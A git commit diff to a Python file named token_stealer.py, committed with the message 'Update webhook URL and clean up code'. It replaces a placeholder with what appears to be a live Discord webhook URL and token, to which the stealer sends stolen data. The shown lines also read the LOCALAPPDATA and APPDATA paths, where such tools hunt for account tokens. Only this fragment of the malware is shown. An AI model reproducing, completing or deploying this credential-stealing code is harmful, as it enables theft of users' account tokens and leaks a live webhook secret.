4d470c8b5c9f14392c8b26744277e3b4fa7836b5
tasnimsara18-debug <tasnim.sara18@gmail.com>
2026-09-09 16:20:45 +0600

    Update webhook URL and clean up code

--- token_stealer.py
+++ token_stealer.py
@@ -13,7 +13,7 @@ from sys import argv
 dt = datetime.now()
 
 # Paste your webhook url to "URL_HERE"
-WEBHOOK_URL = 'URL_HERE'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1547183285614936145/Wk3Ruj7jb_eNYg0Ue3mTRInqhzMXcpI8U7A1wQF9MVCgAEssoySo9X6iE8eeOFdGC3Nr'
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
